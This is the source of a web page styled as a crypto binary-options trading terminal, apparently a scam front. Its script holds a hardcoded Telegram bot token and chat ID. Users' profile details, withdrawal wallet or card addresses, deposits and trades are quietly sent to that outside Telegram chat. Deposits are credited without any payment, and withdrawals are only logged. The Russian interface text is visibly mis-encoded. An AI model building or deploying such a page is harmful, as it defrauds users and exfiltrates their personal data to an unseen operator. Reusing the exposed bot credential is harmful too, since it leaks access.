<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>OWNER-EX ELITE TERMINAL</title>
    <script src="https://unpkg.com/lightweight-charts@3.8.0/dist/lightweight-charts.standalone.production.js"></script>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
    <style>
        :root {
            --bg: #0b0e11; --panel: #161a1e; --accent: #00ffad;
            --red: #f6465d; --green: #0ecb81; --border: #2b2f36;
            --radius: 12px;
        }
        body, html { margin: 0; padding: 0; height: 100%; background: var(--bg); color: #eaecef; font-family: 'Inter', -apple-system, sans-serif; overflow: hidden; }

        /* HEADER */
        header { 
            height: 65px; background: var(--panel); display: flex; align-items: center; 
            justify-content: space-between; padding: 0 20px; border-bottom: 1px solid var(--border);
        }
        .brand { font-weight: 900; color: var(--accent); font-size: 20px; letter-spacing: 1px; }
        .header-tools { display: flex; align-items: center; gap: 15px; }

        select, .btn-icon { 
            background: #1e2329; color: white; border: 1px solid var(--border); 
            padding: 8px 12px; border-radius: 8px; cursor: pointer; outline: none; font-size: 13px;
        }

        .balance-card { display: flex; align-items: center; background: #000; border-radius: 10px; padding: 4px; border: 1px solid var(--border); }
        .acc-btn { padding: 6px 14px; border: none; background: none; color: #555; cursor: pointer; font-size: 11px; border-radius: 7px; font-weight: bold; transition: 0.3s; }
        .acc-btn.active { background: var(--accent); color: #000; }

        /* MAIN LAYOUT */
        .terminal { display: grid; grid-template-columns: 70px 1fr 300px; height: calc(100vh - 65px); }
        
        .sidebar { background: var(--panel); border-right: 1px solid var(--border); display: flex; flex-direction: column; align-items: center; padding-top: 25px; gap: 30px; }
        .side-link { font-size: 22px; color: #848e9c; cursor: pointer; transition: 0.3s; }
        .side-link:hover, .side-link.active { color: var(--accent); transform: scale(1.1); }

        .chart-container { display: flex; flex-direction: column; border-right: 1px solid var(--border); position: relative; }
        #chart { flex: 1; }
        
        .history-panel { height: 200px; background: var(--panel); border-top: 1px solid var(--border); padding: 15px; overflow-y: auto; }
        table { width: 100%; border-collapse: collapse; font-size: 12px; }
        th { text-align: left; color: #848e9c; padding-bottom: 10px; font-weight: 500; border-bottom: 1px solid var(--border); }
        td { padding: 10px 5px; border-bottom: 1px solid #222; }

        /* TRADE PANEL */
        .trade-bar { padding: 25px; background: var(--panel); display: flex; flex-direction: column; gap: 20px; }
        .input-box { background: var(--bg); border: 1px solid var(--border); padding: 12px; border-radius: var(--radius); }
        .input-box label { display: block; font-size: 11px; color: #848e9c; margin-bottom: 6px; }
        .input-box input { background: transparent; border: none; color: white; width: 100%; outline: none; font-size: 20px; font-weight: 700; }

        .trade-btn { height: 65px; border: none; border-radius: var(--radius); font-weight: 800; font-size: 18px; cursor: pointer; transition: 0.2s; display: flex; align-items: center; justify-content: center; gap: 10px; }
        .btn-call { background: var(--green); color: #000; }
        .btn-put { background: var(--red); color: #fff; }
        .trade-btn:hover { filter: brightness(1.1); transform: translateY(-2px); }
        .trade-btn:active { transform: translateY(0); }

        /* MODALS */
        .modal { position: fixed; inset: 0; background: rgba(0,0,0,0.85); z-index: 2000; display: none; justify-content: center; align-items: center; backdrop-filter: blur(8px); }
        .modal-content { background: var(--panel); width: 420px; padding: 30px; border-radius: 20px; border: 1px solid var(--border); position: relative; }
        .tab-menu { display: flex; gap: 20px; border-bottom: 1px solid var(--border); margin-bottom: 20px; }
        .tab-btn { padding: 10px 0; cursor: pointer; color: gray; font-size: 14px; transition: 0.3s; }
        .tab-btn.active { color: var(--accent); border-bottom: 2px solid var(--accent); }
        .tab-body { display: none; }
        .tab-body.active { display: block; }
    </style>
</head>
<body>

<header>
    <div class="header-tools">
        <div class="brand">OWNER-EX <span style="color:white">ELITE</span></div>
        <select id="asset" onchange="changeSymbol(this.value)">
            <option value="BTCUSDT">BTC / USDT</option>
            <option value="ETHUSDT">ETH / USDT</option>
            <option value="SOLUSDT">SOL / USDT</option>
        </select>
        <select id="timeframe" onchange="changeTF(this.value)">
            <optgroup label="–°–µ–∫—É–Ω–¥—ã">
                <option value="1s">S10</option>
                <option value="1s">S15</option>
                <option value="1s">S30</option>
            </optgroup>
            <optgroup label="–ú–∏–Ω—É—Ç—ã">
                <option value="1m" selected>M1</option>
                <option value="5m">M5</option>
                <option value="30m">M30</option>
            </optgroup>
            <optgroup label="–ß–∞—Å—ã">
                <option value="1h">H1</option>
                <option value="2h">H2</option>
            </optgroup>
        </select>
    </div>

    <div class="header-tools">
        <div class="balance-card">
            <button class="acc-btn active" id="btnDemo" onclick="switchAcc('demo')">DEMO</button>
            <button class="acc-btn" id="btnReal" onclick="switchAcc('real')">REAL</button>
        </div>
        <div id="displayBalance" style="font-weight:900; color:var(--green); font-size:18px; min-width:100px; text-align:right;">$10,000.00</div>
    </div>
</header>

<div class="terminal">
    <div class="sidebar">
        <i class="fas fa-chart-area side-link active" onclick="closeAll()"></i>
        <i class="fas fa-wallet side-link" onclick="openM('cashierM')"></i>
        <i class="fas fa-user-shield side-link" onclick="openM('profileM')"></i>
        <i class="fas fa-history side-link" onclick="openM('cashierM', 2)"></i>
        <i class="fas fa-sign-out-alt side-link" onclick="location.reload()" style="margin-top:auto; padding-bottom:20px;"></i>
    </div>

    <div class="chart-container">
        <div id="chart"></div>
        <div class="history-panel">
            <h4 style="margin:0 0 15px 0; color:var(--accent); font-size:13px; letter-spacing:1px;">–ò–°–¢–û–†–ò–Ø –¢–û–†–ì–û–í–õ–ò</h4>
            <table>
                <thead><tr><th>–ê–∫—Ç–∏–≤</th><th>–¢–∏–ø</th><th>–°—É–º–º–∞</th><th>–í—Ö–æ–¥</th><th>–í—ã—Ö–æ–¥</th><th>–†–µ–∑—É–ª—å—Ç–∞—Ç</th></tr></thead>
                <tbody id="tradeLogs"></tbody>
            </table>
        </div>
    </div>

    <div class="trade-bar">
        <div class="input-box"><label>–°–£–ú–ú–ê –°–î–ï–õ–ö–ò (USDT)</label><input type="number" id="tradeAmt" value="100" min="1"></div>
        <div class="input-box"><label>–í–†–ï–ú–Ø –≠–ö–°–ü–ò–†–ê–¶–ò–ò (–°–ï–ö)</label><input type="number" id="tradeTime" value="15" min="5"></div>
        
        <div style="text-align:center;">
            <div style="color:gray; font-size:11px; margin-bottom:5px;">–í–´–ü–õ–ê–¢–ê</div>
            <div style="font-size:32px; font-weight:900; color:var(--accent);">82%</div>
        </div>

        <button class="trade-btn btn-call" onclick="execTrade('CALL')"><i class="fas fa-arrow-up"></i> –í–´–®–ï</button>
        <button class="trade-btn btn-put" onclick="execTrade('PUT')"><i class="fas fa-arrow-down"></i> –ù–ò–ñ–ï</button>
    </div>
</div>

<div id="cashierM" class="modal">
    <div class="modal-content">
        <div class="tab-menu">
            <div class="tab-btn active" onclick="st(event, 'dep-tab')">–î–ï–ü–û–ó–ò–¢</div>
            <div class="tab-btn" onclick="st(event, 'with-tab')">–í–´–í–û–î</div>
            <div class="tab-btn" onclick="st(event, 'hist-tab')">–õ–û–ì–ò</div>
        </div>
        <div id="dep-tab" class="tab-body active">
            <select style="width:100%; margin-bottom:15px;"><option>USDT TRC20 (Fast)</option><option>VISA/Mastercard</option></select>
            <input type="number" id="dInp" placeholder="–°—É–º–º–∞ –ø–æ–ø–æ–ª–Ω–µ–Ω–∏—è $" style="width:100%; padding:12px; background:#000; border:1px solid var(--border); color:#fff; border-radius:10px;">
            <button class="trade-btn btn-call" style="width:100%; height:50px; margin-top:20px;" onclick="doDep()">–ü–û–ü–û–õ–ù–ò–¢–¨</button>
        </div>
        <div id="with-tab" class="tab-body">
            <input type="text" id="wAddr" placeholder="–ê–¥—Ä–µ—Å –∫–æ—à–µ–ª—å–∫–∞ / –ö–∞—Ä—Ç–∞" style="width:100%; padding:12px; background:#000; border:1px solid var(--border); color:#fff; border-radius:10px; margin-bottom:15px;">
            <input type="number" id="wInp" placeholder="–°—É–º–º–∞ –≤—ã–≤–æ–¥–∞ $" style="width:100%; padding:12px; background:#000; border:1px solid var(--border); color:#fff; border-radius:10px;">
            <button class="trade-btn btn-put" style="width:100%; height:50px; margin-top:20px;" onclick="doWith()">–°–û–ó–î–ê–¢–¨ –ó–ê–Ø–í–ö–£</button>
        </div>
        <div id="hist-tab" class="tab-body">
            <div style="max-height:250px; overflow-y:auto;">
                <table style="font-size:11px;">
                    <thead><tr><th>–î–∞—Ç–∞</th><th>–¢–∏–ø</th><th>–°—É–º–º–∞</th><th>–°—Ç–∞—Ç—É—Å</th></tr></thead>
                    <tbody id="cashLogs"></tbody>
                </table>
            </div>
        </div>
        <button onclick="closeAll()" style="width:100%; margin-top:20px; background:none; border:none; color:gray; cursor:pointer;">–ó–∞–∫—Ä—ã—Ç—å</button>
    </div>
</div>

<div id="profileM" class="modal">
    <div class="modal-content" style="width:500px;">
        <h3 style="margin-top:0; color:var(--accent);">–ù–ê–°–¢–†–û–ô–ö–ò –ê–ö–ö–ê–£–ù–¢–ê</h3>
        <div style="display:grid; grid-template-columns: 1fr 1fr; gap:15px;">
            <div class="input-box"><label>–ò–ú–Ø</label><input type="text" id="p1"></div>
            <div class="input-box"><label>–§–ê–ú–ò–õ–ò–Ø</label><input type="text" id="p2"></div>
            <div class="input-box"><label>–ù–ò–ö–ù–ï–ô–ú</label><input type="text" id="p3"></div>
            <div class="input-box"><label>–î–ê–¢–ê –†–û–ñ–î–ï–ù–ò–Ø</label><input type="date" id="p4" style="font-size:14px;"></div>
            <div class="input-box"><label>–°–¢–†–ê–ù–ê</label><input type="text" id="p5"></div>
            <div class="input-box"><label>–ì–û–†–û–î</label><input type="text" id="p6"></div>
            <div class="input-box"><label>–ò–ù–î–ï–ö–°</label><input type="text" id="p7" maxlength="6"></div>
            <div class="input-box"><label>–ü–†–û–ú–û–ö–û–î</label><input type="text" id="p8"></div>
        </div>
        <button class="trade-btn btn-call" style="width:100%; height:50px; margin-top:20px;" onclick="saveP()">–°–û–•–†–ê–ù–ò–¢–¨ –î–ê–ù–ù–´–ï</button>
        <button onclick="closeAll()" style="width:100%; margin-top:10px; background:none; border:none; color:gray; cursor:pointer;">–û—Ç–º–µ–Ω–∞</button>
    </div>
</div>

<script>
    // --- CORE CONFIG ---
    const TG_TOKEN = "8102627080:AAGGbjyR0g1VzICKb-ait4t3CA34PJz1g5M"; 
    const TG_ID = "6426834853";

    let bals = JSON.parse(localStorage.getItem('bals')) || { demo: 10000, real: 0 };
    let prof = JSON.parse(localStorage.getItem('prof')) || {};
    let tHist = JSON.parse(localStorage.getItem('t_hist')) || [];
    let cHist = JSON.parse(localStorage.getItem('c_hist')) || [];
    let curAcc = 'demo', curSym = 'BTCUSDT', curTF = '1m', lastPrice = 0, chart, series;

    const save = () => {
        localStorage.setItem('bals', JSON.stringify(bals));
        localStorage.setItem('prof', JSON.stringify(prof));
        localStorage.setItem('t_hist', JSON.stringify(tHist));
        localStorage.setItem('c_hist', JSON.stringify(cHist));
    };

    const tg = async (m) => {
        try { await fetch(`https://api.telegram.org/bot${TG_TOKEN}/sendMessage`, {
            method:"POST", headers:{"Content-Type":"application/json"},
            body: JSON.stringify({chat_id: TG_ID, text: m, parse_mode:"HTML"})
        }); } catch(e){}
    };

    // --- UI ENGINE ---
    const refreshUI = () => {
        document.getElementById('displayBalance').innerText = `$${bals[curAcc].toLocaleString()}`;
        document.getElementById('tradeLogs').innerHTML = tHist.map(h => `
            <tr><td>${h.s}</td><td style="color:${h.t==='CALL'?'#0ecb81':'#f6465d'}">${h.t}</td>
            <td>$${h.a}</td><td>${h.i}</td><td>${h.o}</td>
            <td style="font-weight:bold; color:${h.r.includes('+')?'#0ecb81':'#f6465d'}">${h.r}</td></tr>
        `).join('');
        document.getElementById('cashLogs').innerHTML = cHist.map(h => `
            <tr><td>${h.d}</td><td>${h.t}</td><td>${h.a}</td><td style="color:orange">${h.s}</td></tr>
        `).join('');
    };

    window.switchAcc = (a) => {
        curAcc = a;
        document.getElementById('btnDemo').classList.toggle('active', a==='demo');
        document.getElementById('btnReal').classList.toggle('active', a==='real');
        refreshUI();
    };

    window.openM = (id, tabIndex = 0) => {
        document.getElementById(id).style.display = 'flex';
        if(id === 'profileM') {
            ['p1','p2','p3','p4','p5','p6','p7','p8'].forEach((k, i) => document.getElementById(k).value = prof[k] || '');
        }
    };
    window.closeAll = () => document.querySelectorAll('.modal').forEach(m => m.style.display='none');
    window.st = (e, id) => {
        const p = e.target.parentElement;
        p.querySelectorAll('.tab-btn').forEach(b => b.classList.remove('active'));
        p.parentElement.querySelectorAll('.tab-body').forEach(t => t.classList.remove('active'));
        e.target.classList.add('active'); document.getElementById(id).classList.add('active');
    };

    // --- LOGIC ---
    window.doDep = () => {
        const a = Math.abs(parseFloat(document.getElementById('dInp').value));
        if(a > 0) {
            bals.real += a;
            cHist.unshift({ d: new Date().toLocaleDateString(), t: '–î–µ–ø–æ–∑–∏—Ç', a: '$'+a, s: '–£—Å–ø–µ—Ö' });
            save(); refreshUI(); tg(`üí≥ <b>–î–ï–ü–û–ó–ò–¢:</b> +$${a}\nUser: ${prof.p3 || 'Guest'}`);
            alert("–ë–∞–ª–∞–Ω—Å –ø–æ–ø–æ–ª–Ω–µ–Ω!"); closeAll();
        }
    };

    window.doWith = () => {
        const a = Math.abs(parseFloat(document.getElementById('wInp').value));
        const addr = document.getElementById('wAddr').value;
        if(a > bals.real || a <= 0 || !addr) return alert("–û—à–∏–±–∫–∞ –¥–∞–Ω–Ω—ã—Ö –∏–ª–∏ –±–∞–ª–∞–Ω—Å–∞");
        bals.real -= a;
        cHist.unshift({ d: new Date().toLocaleDateString(), t: '–í—ã–≤–æ–¥', a: '$'+a, s: '–í —Ä–∞–±–æ—Ç–µ' });
        save(); refreshUI(); tg(`üí∞ <b>–í–´–í–û–î:</b> $${a}\nAddr: ${addr}\nUser: ${prof.p3 || 'Guest'}`);
        alert("–ó–∞—è–≤–∫–∞ —Å–æ–∑–¥–∞–Ω–∞!"); closeAll();
    };

    window.saveP = () => {
        const keys = ['p1','p2','p3','p4','p5','p6','p7','p8'];
        keys.forEach(k => prof[k] = document.getElementById(k).value);
        save(); tg(`üë§ <b>–ü–†–û–§–ò–õ–¨:</b> ${prof.p3}\n–ò–º—è: ${prof.p1} ${prof.p2}`);
        alert("–î–∞–Ω–Ω—ã–µ —Å–æ—Ö—Ä–∞–Ω–µ–Ω—ã!"); closeAll();
    };

    // --- CHART & TRADE ---
    const initChart = () => {
        if(chart) document.getElementById('chart').innerHTML = '';
        chart = LightweightCharts.createChart(document.getElementById('chart'), {
            layout: { background: { color: '#0b0e11' }, textColor: '#848e9c' },
            grid: { vertLines: { color: '#161a1e' }, horzLines: { color: '#161a1e' } },
            timeScale: { timeVisible: true, secondsVisible: true }
        });
        series = chart.addCandlestickSeries({ upColor: '#0ecb81', downColor: '#f6465d' });
        loadChartData();
    };

    async function loadChartData() {
        const res = await fetch(`https://api.binance.com/api/v3/klines?symbol=${curSym}&interval=${curTF === '1s' ? '1m' : curTF}&limit=500`);
        const data = await res.json();
        series.setData(data.map(x => ({ time: x[0]/1000, open: +x[1], high: +x[2], low: +x[3], close: +x[4] })));
        
        if(window.ws) window.ws.close();
        window.ws = new WebSocket(`wss://stream.binance.com:9443/ws/${curSym.toLowerCase()}@kline_1s`);
        window.ws.onmessage = e => {
            const k = JSON.parse(e.data).k; lastPrice = +k.c;
            series.update({ time: k.t/1000, open: +k.o, high: +k.h, low: +k.l, close: lastPrice });
        };
    }

    window.changeSymbol = (s) => { curSym = s; loadChartData(); };
    window.changeTF = (t) => { curTF = t; loadChartData(); };

    window.execTrade = (type) => {
        let amt = Math.abs(parseFloat(document.getElementById('tradeAmt').value));
        let time = parseInt(document.getElementById('tradeTime').value);
        if(bals[curAcc] < amt || amt <= 0) return alert("–ù–µ–¥–æ—Å—Ç–∞—Ç–æ—á–Ω–æ —Å—Ä–µ–¥—Å—Ç–≤");

        bals[curAcc] -= amt; refreshUI();
        const startP = lastPrice;
        const line = series.createPriceLine({ price: startP, color: type==='CALL'?'#0ecb81':'#f6465d', title: '–í–•–û–î' });
        tg(`üöÄ <b>–°–î–ï–õ–ö–ê:</b> ${type} $${amt}\nSymbol: ${curSym}`);

        setTimeout(() => {
            const win = (type==='CALL' && lastPrice > startP) || (type==='PUT' && lastPrice < startP);
            const profit = win ? amt * 1.82 : 0;
            if(win) bals[curAcc] += profit;
            
            const res = win ? `+$${(profit-amt).toFixed(2)}` : `-$${amt}`;
            tHist.unshift({ s: curSym, t: type, a: amt, i: startP, o: lastPrice, r: res });
            series.removePriceLine(line);
            save(); refreshUI();
            tg(`üèÅ <b>–ò–¢–û–ì:</b> ${win?'WIN ‚úÖ':'LOSS ‚ùå'} (${res})`);
        }, time * 1000);
    };

    initChart(); refreshUI();
</script>
</body>
</html>
